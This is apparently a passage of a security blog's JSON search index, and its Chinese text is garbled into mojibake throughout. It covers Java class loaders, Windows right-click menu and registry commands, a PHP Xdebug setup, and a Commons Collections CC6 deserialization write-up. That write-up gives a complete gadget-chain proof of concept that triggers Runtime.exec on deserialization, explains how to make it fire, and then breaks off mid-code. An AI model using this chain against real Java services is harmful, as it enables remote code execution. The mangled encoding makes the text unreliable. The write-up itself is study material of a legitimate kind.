è½½å™¨é€šè¿‡å‘ä¸Šå§”æ‰˜ï¼Œä¸¤ä¸ªIntegerï¼Œé‚£ä¹ˆæœ€ç»ˆè¢«åŠ è½½çš„åº”è¯¥æ˜¯jdkçš„Integerç±»ï¼Œè€Œå¹¶éæˆ‘ä»¬è‡ªå®šä¹‰çš„ï¼Œè¿™æ ·å°±é¿å…äº†æˆ‘ä»¬æ¶æ„ç¯¡æ”¹æ ¸å¿ƒåŒ…çš„é£é™©\néš”ç¦»åŠŸèƒ½ï¼šä¿è¯æ ¸å¿ƒç±»åº“çš„çº¯å‡€å’Œå®‰å…¨ï¼Œé˜²æ­¢æ¶æ„åŠ è½½ã€‚\nä¼˜ç‚¹1,2æ˜¯ç”±äºåªä¼šåŠ è½½ä¸€æ¬¡ï¼Œä¼˜ç‚¹3,4æ˜¯å› ä¸ºåŠ è½½ä¼˜å…ˆçº§æ˜¯ä»çˆ¶ç±»åˆ°å­ç±»\nç¼ºç‚¹ åŒäº²å§”æ´¾æ¨¡å‹çš„å…¸å‹é—®é¢˜æ˜¯åŠ è½½ SPI å®ç°ç±»çš„åœºæ™¯ï¼Œæ¯”å¦‚ JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJava å‘½åä¸ç›®å½•æ¥å£ï¼‰æœåŠ¡ã€‚\nå®ƒçš„ä»£ç ç”±å¯åŠ¨ç±»åŠ è½½å™¨å»åŠ è½½(åœ¨ JDK 1.3 æ—¶æ”¾è¿› rt.jar)ï¼Œä½† JNDI çš„ç›®çš„å°±æ˜¯å¯¹èµ„æºè¿›è¡Œé›†ä¸­ç®¡ç†å’ŒæŸ¥æ‰¾ï¼Œå®ƒéœ€è¦è°ƒç”¨ç‹¬ç«‹å‚å•†å®ç°éƒ¨éƒ¨ç½²åœ¨åº”ç”¨ç¨‹åºçš„ classpath ä¸‹çš„ JNDI æ¥å£æä¾›è€…ï¼ˆSPI, Service Provider Interfaceï¼‰çš„ä»£ç ï¼Œä½†å¯åŠ¨ç±»åŠ è½½å™¨ä¸å¯èƒ½â€œè®¤è¯†â€ä¹‹äº›ä»£ç ï¼Œè¿™å°±åŒäº²å§”æ´¾æ¨¡å‹çš„é—®é¢˜ï¼ŒJDBC ä¹Ÿæ˜¯åŒæ ·çš„é—®é¢˜ã€‚\nå‚è€ƒé“¾æ¥ https://zhuanlan.zhihu.com/p/382020126\nhttps://blog.csdn.net/qq_21484461/article/details/131421264\nhttps://zhuanlan.zhihu.com/p/603047338\nhttps://frank909.blog.csdn.net/article/details/54973413\nhttps://www.cnblogs.com/hackerxian/p/10871667.html\n","date":"2024-11-06T14:52:13+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240807214918011.png","permalink":"https://d4n-sec.github.io/p/bytecodeanndloadclass/","title":"Javaå­—èŠ‚ç ä¸ç±»åŠ è½½å™¨"},{"content":"æœ€è¿‘å…¶å®å­¦åˆ°çš„ä¸œè¥¿è¶Šæ¥è¶Šå¤šäº†ï¼Œä½†æ˜¯ä¸çŸ¥æ€çš„ï¼Œå†™æ–‡ç« çš„æ¬²æœ›å´å˜å¾—ä½è¿·äº†èµ·æ¥ï¼Œä¸çŸ¥æ˜¯å› ä¸ºä»€ä¹ˆ\nä¹Ÿè®¸æ˜¯å› ä¸ºå…¶ä¸­éƒ¨åˆ†çŸ¥è¯†ç®—çš„ä¸Šæ˜¯å·²ç»å­¦è¿‡äº†ï¼Œå¦‚æœé‡å¤å†™çš„è¯ä¼šæ„Ÿè§‰â€œæµªè´¹æ—¶é—´â€å§\nä½†æ˜¯å†™æ–‡ç« çš„åˆè¡·æ˜¯æ€•å¿˜è®°è€Œéç»™è°è°çœ‹çš„ä¸æ˜¯å—\nä¹Ÿè®¸äººå°±æ˜¯éœ€è¦æ‹§å·´åœ°è¿‡å®Œä¸€ç”Ÿå§\n","date":"2024-11-06T14:43:26+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241106180621486.png","permalink":"https://d4n-sec.github.io/p/feel_2024-11-06-14-43-11/","title":"24-11-06 æœ‰æ„Ÿ"},{"content":"Windows å¤šçº§å³é”®èœå•åŸºç¡€ ä¿®æ”¹çš„é”®ä¸é¡¹ Win10é¼ æ ‡å³é”®èœå•ç®¡ç†åˆ†ä¸ºä¸‰ç§æƒ…å½¢ï¼šå³é”®æ–‡ä»¶å¤¹ã€æ–‡ä»¶ä»¥åŠå³é”®ç©ºç™½åŒºåŸŸ\nå³é”®ç©ºç™½åŒºåŸŸï¼ˆåˆ†ä¸ºæ¡Œé¢ç©ºç™½åŒºåŸŸå’Œå…¶ä»–æ–‡ä»¶å¤¹ä¸‹ç©ºç™½åŒºåŸŸï¼‰ å³é”®æ–‡ä»¶å¤¹ å³é”®æ–‡ä»¶ï¼ˆåˆ†ä¸ºæ‰€æœ‰æ–‡ä»¶å’ŒæŸç±»å‹æ–‡ä»¶ä¸¤ç§ï¼‰ ç»å¤§éƒ¨åˆ†æƒ…å†µåªéœ€è¦å…³ç³»HKEY_CLASSES_ROOTå³å¯\né¡¹ï¼š\nSubCommandsï¼šå¦‚æœæŸé”®éœ€è¦è®¾ç½®ä¸ºæ‹¥æœ‰å­èœå•ï¼Œé‚£ä¹ˆéœ€è¦SubCommandsï¼Œå¦‚æ ·ä¾‹å›¾2\nMUIVerbï¼šæ˜¾ç¤ºçš„å­—ç¬¦ä¸²\né”®ï¼š\nshellï¼šè‡ªå®šä¹‰çš„é”®éœ€è¦åœ¨shellé”®ä¸‹\ncommandï¼šç»‘å®šexeï¼Œå¹¶å¯¹å…¶ä¼ å‚\nå…³äºä¼ å‚ 1 2 3 4 5 6 7 8 %0 //é€‰ä¸­çš„å•ä¸ªæ–‡ä»¶çš„è·¯å¾„ %1 //é€‰ä¸­çš„å•ä¸ªæ–‡ä»¶çš„è·¯å¾„ %2 //é€‰ä¸­çš„å•ä¸ªæ–‡ä»¶çš„æ‰€åœ¨æ–‡ä»¶å¤¹è·¯å¾„ %* //é€‰ä¸­çš„æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œç©ºæ ¼åˆ†éš” %V //é€‰ä¸­çš„è‹¥ä¸ºå¿«æ·æ–¹å¼ï¼Œåˆ™ä¸ºç›®æ ‡è·¯å¾„ï¼Œå¦åˆ™åŒ%1 %n //é€‰ä¸­çš„æ–‡ä»¶åï¼ˆæ— æ‰©å±•åï¼‰ %x //é€‰ä¸­çš„æ–‡ä»¶æ‰©å±•å %W //å·¥ä½œç›®å½• %0å’Œ%1åœ¨å¯¹å¤šä¸ªæ–‡ä»¶å¤¹å’Œå•ä¸ªæ–‡ä»¶å¤¹é€‰ä¸­å³é”®æ—¶ï¼Œè¡¨ç°å‡ä¸€è‡´\nç¬”è€…ç¯å¢ƒä¸ºWin11\nåœ¨commandè®¾ç½®ä¸ºcmd.exe /c 1.bat %0æ—¶ï¼Œ\næœ‰è¶£çš„æ˜¯ï¼Œé€‰ä¸­å¤šä¸ªæ–‡ä»¶å¤¹å³é”®ç‚¹å‡»æ—¶ï¼Œä¼ å‚æ˜¯åˆ†åˆ«ä¼ é€’çš„ï¼Œä¾‹å¦‚é€‰ä¸­äº†æ–‡ä»¶å¤¹a,bä¸¤ä¸ªï¼Œä¼šè°ƒç”¨ä¸¤æ¬¡commandé‡Œçš„å†…å®¹ï¼Œå³æ‰§è¡Œä¸¤æ¬¡commandï¼Œåˆ†åˆ«ä¸º\ncmd.exe /c 1.bat a\ncmd.exe /c 1.bat b\n%*ä¹Ÿæ˜¯ä¸€æ ·\nç¤ºä¾‹ æ ·ä¾‹ï¼š\næ•ˆæœï¼š\nç‚¹å‡»åä¼šè°ƒç”¨æŒ‡å®šçš„vbsæ–‡ä»¶ï¼Œä¼ å‚æ˜¯ deletexxxx å’Œ %0\nvbsè„šæœ¬å†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 strpass = \u0026#34;\u0026#34; For each i in WScript.Arguments strpass = strpass \u0026amp; \u0026#34; \u0026#34; \u0026amp; i Next \u0026#39; msgbox strpass Set WshShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) strPythonScript = \u0026#34;D:\\Users\\lidm11\\Code\\rightMenu\\fenfa.py\u0026#34; strCommand = \u0026#34;python.exe \u0026#34; \u0026amp; strPythonScript \u0026amp; \u0026#34; \u0026#34; \u0026amp; strpass \u0026#39; msgbox strCommand WshShell.Run strCommand, 0, true ç¬¬ä¸€æ®µæ‹¼æ¥è·å¾—çš„å‚æ•°ï¼Œç¬¬äºŒæ®µä¼ é€’ç»™pythonè„šæœ¬é™é»˜æ‰§è¡Œ\nè„šæœ¬å†…å®¹å°±æ ¹æ®ä¼ å‚çµæ´»è‡ªå®šä¹‰äº†\nå­˜æ¡£ï¼Œè„±æ•çš„å¯¼å‡ºæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool] \u0026#34;MUIVerb\u0026#34;=\u0026#34;tools\u0026#34; \u0026#34;SubCommands\u0026#34;=\u0026#34;\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell] [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyDir] \u0026#34;MUIVerb\u0026#34;=\u0026#34;é€’å½’æ¸…é™¤ç©ºå­æ–‡ä»¶å¤¹\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyDir\\command] @=\u0026#34;wscript.exe D:\\\\fenfa.vbs deleteEmptyDir %0\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyFile] \u0026#34;MUIVerb\u0026#34;=\u0026#34;é€’å½’æ¸…é™¤ç©ºæ–‡ä»¶\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyFile\\command] @=\u0026#34;wscript.exe D:\\\\fenfa.vbs deleteEmptyFile %0\u0026#34; ","date":"2024-10-17T16:09:39+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240914182009341.png","permalink":"https://d4n-sec.github.io/p/windowsrightmenu/","title":"Windows å³é”®èœå•"},{"content":"Windows æ³¨å†Œè¡¨åŸºç¡€ Windowsæ³¨å†Œè¡¨çš„æœ¬è´¨ å®˜æ–¹æè¿°\næ³¨å†Œè¡¨æ˜¯ä¸€ä¸ªåˆ†å±‚æ•°æ®åº“ï¼Œå…¶ä¸­åŒ…å«å¯¹ Windows çš„æ“ä½œä»¥åŠ Windows ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡è‡³å…³é‡è¦çš„æ•°æ®ã€‚ æ•°æ®ä»¥æ ‘æ ¼å¼è¿›è¡Œç»“æ„åŒ–ã€‚ æ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ç§°ä¸º é”®ã€‚ æ¯ä¸ªé”®å¯ä»¥åŒæ—¶åŒ…å« å­é¡¹ å’Œæ•°æ®æ¡ç›®ï¼ˆç§°ä¸º å€¼ï¼‰ã€‚\nå›¾è§£\nå¯ä»¥è¡¥å……çš„æ˜¯é¡¹ç±»å‹\nREG_SZï¼šå­—ç¬¦ä¸²ï¼šæ–‡æœ¬å­—ç¬¦ä¸²\nREG_MULTI_SZï¼šå¤šå­—ç¬¦ä¸²å€¼ï¼šå«æœ‰å¤šä¸ªæ–‡æœ¬å€¼çš„å­—ç¬¦ä¸²\nREG_BINARYï¼šäºŒè¿›åˆ¶æ•°ï¼šäºŒè¿›åˆ¶å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œ\nREG_DWORDï¼šåŒå­—å€¼ï¼›ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶å€¼ï¼Œæ˜¾ç¤ºä¸º8ä½çš„åå…­è¿›åˆ¶å€¼ã€‚\nå¦‚ä½•æ‰“å¼€ win+Ræ‰“å¼€è¿è¡Œï¼Œè¾“å…¥regeditï¼Œå›è½¦å³å¯æ‰“å¼€å›¾å½¢åŒ–ç•Œé¢\nCmdå¯¹æ³¨å†Œè¡¨çš„åŸºæœ¬æ“ä½œ æ“ä½œå‰å»ºè®®å¤‡ä»½ï¼Œä»¥ä¾¿æ¢å¤\nreg add KeyName [/v EntryName|/ve] [/t DataType] [/s separator] [/d value] [/f] reg addå°†æ–°çš„å­é¡¹æˆ–é¡¹æ·»åŠ åˆ°æ³¨å†Œè¡¨ä¸­\nç¤ºä¾‹ï¼šreg add \u0026quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\Advanced\\Folder\\Hidden\\SHOWALL\u0026quot; /v Checkedvalue /t reg_dword /d 1 /f\nKeyNameï¼šé”®è·¯å¾„\n/vï¼šæŒ‡å®šé¡¹-åç§°\n/tï¼šæŒ‡å®šé¡¹-ç±»å‹\n/dï¼šæŒ‡å®šé¡¹-å€¼\n/fï¼šå¼ºåˆ¶ï¼Œæ— éœ€è¯¢é—®\nreg delete KeyName [{/v EntryName|/ve|/va}] [/f] reg deleteä»æ³¨å†Œè¡¨åˆ é™¤é¡¹æˆ–å­é¡¹\nä¸reg addç»†èŠ‚ä¸€è‡´ï¼Œæœ‰ä¸€äº›å‚æ•°ä¸åŒï¼Œæœ€å¸¸ç”¨çš„å¦‚ä¸‹\n/veï¼šæŒ‡å®šåªå¯ä»¥åˆ é™¤ä¸ºç©ºå€¼çš„é¡¹\nreg query KeyName [{/v EntryName|/ve}] [/s] reg queryè¿”å›æ³¨å†Œè¡¨çš„å­é¡¹ä¸‹çš„é¡¹å’Œä¸‹ä¸€å±‚å­é¡¹çš„åˆ—è¡¨\nreg compare KeyName1 KeyName2 [/v EntryName | /ve] {[/oa]|[/od]|[/os]|[on]} [/s] reg compareæ¯”è¾ƒæŒ‡å®šçš„æ³¨å†Œè¡¨å­é¡¹æˆ–é¡¹\nreg copy KeyName1 KeyName2 [/s] [/f] reg copyå°†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹å¤åˆ¶åˆ°æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºçš„æŒ‡å®šä½ç½®\nreg export KeyName FileName reg exportå°†æŒ‡å®šå­é¡¹ã€é¡¹å’Œå€¼çš„å‰¯æœ¬åˆ›å»ºåˆ°æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿å°†å…¶ä¼ è¾“åˆ°å…¶å®ƒæœåŠ¡å™¨\nreg import FileName reg importå°†åŒ…å«å¯¼å‡ºçš„æ³¨å†Œè¡¨å­é¡¹ã€é¡¹å’Œå€¼çš„æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°è®¡ç®—æœºçš„æ³¨å†Œè¡¨ä¸­\nreg load KeyName FileName reg loadå°†ä¿å­˜çš„å­é¡¹å’Œé¡¹å†™å›åˆ°æ³¨å†Œè¡¨çš„ä¸åŒå­é¡¹ä¸­\nreg restore KeyName FileName reg restoreå°†ä¿å­˜çš„å­é¡¹å’Œé¡¹å†™å›åˆ°æ³¨å†Œè¡¨\nreg save KeyName FileName reg saveå°†æŒ‡å®šçš„å­é¡¹ã€é¡¹å’Œæ³¨å†Œè¡¨å€¼çš„å‰¯æœ¬ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚\nreg unload KeyName reg unloadä½¿ç”¨reg loadæ“ä½œåˆ é™¤å·²åŠ è½½çš„éƒ¨åˆ†æ³¨å†Œè¡¨\nTips HKEY_CLASSES_ROOT\\.3fr\\OpenWithProgidså…¶å®å¯ä»¥åœ¨å‘½ä»¤è¡Œå†™ä½œHKCR\\.3fr\\OpenWithProgids ","date":"2024-10-15T20:53:41+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241017160018161.png","permalink":"https://d4n-sec.github.io/p/windowsregeditbase/","title":"Windows æ³¨å†Œè¡¨åŸºç¡€"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #æ­£å¼å¼€å§‹å®‰è£… sudo apt update sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install apache2 sudo apt install --no-install-recommends php7.4 sudo apt-get install -y php7.4-cli php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath php7.4-dev php7.4-fpm php -i æ‰¾xdebug # https://xdebug.org/wizard wget https://xdebug.org/files/xdebug-ç‰ˆæœ¬ tar -xvzf xdebug-ç‰ˆæœ¬.tgz cd xdebug-ç‰ˆæœ¬ phpize #ç¡®ä¿å’Œç½‘ä¸Šçš„ä¸€æ · ./configure make #æˆ–è€…make \u0026amp;\u0026amp;sudo make install # è¿™ä¸ªæ—¶å€™ modules æ–‡ä»¶å¤¹ä¸‹å·²ç»æœ‰xdebug.soäº† # æŠŠä»–ä¿å­˜åˆ°ä¸€ä¸ªè·¯å¾„çŸ­ï¼Œä¸”è·¯å¾„ä¸Šæ²¡æœ‰-å·çš„æ–‡ä»¶å¤¹ä¸‹ # å¯ç”¨è·¯å¾„ /home/dan/xdebug/xdebug3.1.6/xdebug.so # ä½¿ç”¨ä¸€ä¸ªphpinfo();ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œæ¨èphpinfo();è™½ç„¶éº»çƒ¦ php -i|grep \u0026#34;php.ini\u0026#34; #æ‰¾åˆ°php.iniè·¯å¾„ #vim ç¼–è¾‘æ·»åŠ  [Xdebug] zend_extension = /home/dan/xdebug/xdebug3.1.6/xdebug.so xdebug.remote_enable=1 xdebug.remote_autostart=1 xdebug.remote_handler=dbgp xdebug.idekey=vscode xdebug.start_with_request=yes xdebug.mode = debug #;;ç‰¹åˆ«æ³¨æ„è¿™ä¸ªåœ°æ–¹æ˜¯client_portï¼Œè€Œxdebug2ä¸­æ˜¯remote_port xdebug.client_host = 0.0.0.0 xdebug.client_port = 9383 #é‡å¯PHPæœåŠ¡ sudo service phpç‰ˆæœ¬-fpm restart sudo service apache2 restart #æŸ¥çœ‹ä¸€ä¸‹xdebugæœ‰æ²¡æœ‰ php -i ï¼ˆåªèƒ½æŸ¥çœ‹cliç‰ˆæœ¬çš„ï¼‰ #ä½¿ç”¨ä¸€ä¸ªphpinfo();ç¡®ä¿apacheç‰ˆæœ¬çš„php.iniæ˜¯å¦è¢«ä¿®æ”¹;å¯ä»¥ç¡®ä¿æ— è¯¯ #;æ–­ç‚¹ï¼Œè®¿é—®ï¼ŒæˆåŠŸ ","date":"2024-08-19T22:11:14+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240819221222949.png","permalink":"https://d4n-sec.github.io/p/devphpdebug/","title":"WSL2 PHP Xdebug è°ƒè¯•ç¯å¢ƒï¼Œå®‰è£…é€Ÿè®°"},{"content":"CC6é“¾ CC6 Demoå­¦ä¹ ï¼Œä»¥åŠè¸©å‘è®°å½•\nCC6 Demo CC6èƒ½å¤Ÿè§£å†³CC1é«˜ç‰ˆæœ¬æ— æ³•åˆ©ç”¨çš„é—®é¢˜ï¼Œå…ˆçœ‹çœ‹CC6é“¾\nè°ƒç”¨æ ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */ ç¬¬8è¡Œåˆ°æœ€åçš„é“¾è·¯æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†ã€‚\næ‰€ä»¥ç®€å•æ¥è¯´ï¼Œè§£å†³Javaâ¾¼ç‰ˆæœ¬åˆ©â½¤é—®é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰¾ä¸Šä¸‹â½‚ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒâ½¤LazyMap.get()çš„åœ°â½…ã€‚\nå¦‚è°ƒç”¨æ ˆæ‰€ç¤ºï¼Œå¯åˆ©ç”¨çš„ç±»æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntry\nTiedMapEntry.getValue()ä¸­è°ƒâ½¤äº†this.map.get() ï¼Œâ½½TiedMapEntry.hashCode()â½…æ³•è°ƒâ½¤äº†TiedMapEntry.getValue()â½…æ³•\nMap.hashCode()è¿™ä¸ªæ–¹æ³•åœ¨URLDNSä¸­å°±æœ‰è¿‡è°ƒç”¨å­¦ä¹ ï¼Œé‚£ä¹ˆï¼Œç›´æ¥æ„é€ CC6é“¾Demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); å¦‚ä¸Šæ–¹ä»£ç æ‰€ç¤ºï¼Œé¦–å…ˆæ„é€ LazyMapï¼Œä½†æ˜¯åœ¨æ„é€ çš„æ—¶å€™å…ˆä¼ é€’ä¸€ä¸ªæ— ç”¨çš„transformerChainï¼Œåœ¨æœ€åå³å°†è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å‰ï¼Œé€šè¿‡åå°„çš„æ„é€ æ›´æ¢ä¸ºçœŸæ­£çš„åˆ©ç”¨é“¾å³å¯ã€‚æ›´æ¢ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ç„¶åå†æ„é€ TiedMapEntryï¼ŒTiedMapEntryæ²¡æœ‰æ— å‚æ„é€ ï¼Œå£°æ˜ä¸ºpublic TiedMapEntry(Map map, Object key)ã€‚æ‰€ä»¥æ„é€ TiedMapEntryå¦‚ä¸‹\n1 TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); ç„¶åå†æ„é€ HashMapï¼Œå¦‚ä¸‹\n1 2 Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); TiedMapEntryå¯¹è±¡æ”¾åœ¨æœ€å¤–å±‚HashMap()çš„Keyå€¼éƒ¨åˆ†ï¼Œä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºHashMap.readObject()ä¸­åªæœ‰å¦‚ä¸‹è¯­å¥è°ƒç”¨äº†hash()ï¼Œè€Œä¼ è¾“å¯¹è±¡æ˜¯Keyï¼š\n1 2 3 4 5 6 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ... putVal(hash(key), key, value, false, false); ... } åœ¨HashMap.hash()ä¸­ï¼Œä¼šå±Œç”¨key.hashCode()ï¼Œå¦‚ä¸‹\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } æ‰€ä»¥HashMapååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒKeyåº”å½“ä¸ºTiedMapEntryå¯¹è±¡ã€‚\nç›®å‰çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonC6dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(MMMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } è¿è¡ŒPOCï¼Œå‘ç°æ— æ³•RCEï¼Œä¸ºä»€ä¹ˆï¼Ÿ\nè¸©å‘æŒ‡å— å…ˆä¸ä½¿ç”¨Debugæ¨¡å¼ï¼Œç›´æ¥è¿è¡Œï¼Œä¹Ÿæ— æ³•RCE\næ— æ³•RCEï¼Œæ­¤æ—¶å°†æ–­ç‚¹æ”¾åœ¨LazyMap.get()ä¸­çš„ç¬¬ä¸€è¡Œã€‚å‘ç°42è¡ŒMMMap.put()çš„æ—¶å€™è°ƒç”¨è¿‡LazyMap.get()ï¼ŒLazyMap.get()æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } ç¬¬ä¸€æ­¥ä¼šåˆ¤æ–­keyå€¼æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œä¼šæ‰§è¡ŒIF == trueçš„å†…å®¹ï¼Œæ‰§è¡Œå®Œåï¼Œmapä¸­å°±ä¼šä¿å­˜ä¸€å¯¹å„¿Keyï¼ŒValueå€¼ã€‚\næŸ¥çœ‹è°ƒç”¨æ ˆï¼Œå‘ç°æ˜¯ä»£ç 42è¡Œè¿›è¡Œputè§¦å‘çš„ã€‚è¿™ä¸€æ­¥ä¼šæŠŠMapå¯¹è±¡èµ‹å€¼ï¼Œä¸‹æ¬¡å†æ¬¡è¿è¡Œæ—¶ï¼Œä¼šå‘ç°Keyå€¼å·²ç»å­˜åœ¨ï¼Œäºæ˜¯è·³è¿‡è§¦å‘ã€‚\nè§£å†³åŠæ³•å°±æ˜¯å°†Mapå¯¹è±¡ï¼Œåœ¨42è¡Œä¹‹åï¼Œæ¸…0æˆ–è€…åˆ é™¤42è¡Œputçš„keyå€¼ã€‚\nå¯ä»¥remove()å’Œclear()ï¼Œä½†æ˜¯å…·ä½“æ“ä½œé‚£ä¸ªå¯¹è±¡å‘¢ï¼Ÿ\nMMMapæ˜¯HashMapå¯¹è±¡ï¼Œé‡Œé¢æœ‰ä¸ªTiedMapEntryå¯¹è±¡keyinnerï¼ŒTiedMapEntryå¯¹è±¡é‡ŒåŒ…è£…çš„æ˜¯LazyMapå¯¹è±¡outerMapï¼ŒLazyMapï¼Œå³outerMapå®é™…ä¸Šåªæœ‰ä¸€ä¸ªå†…ç½®Mapæ˜¯HashMapå¯¹è±¡innerMap\næ‰€ä»¥ï¼ŒouterMapï¼ŒinnerMapéƒ½å¯ä»¥ã€‚ç›´æ¥ä½¿ç”¨outerMap.clear();\nå®Œæ•´POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonC6dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] fakeTransformers = 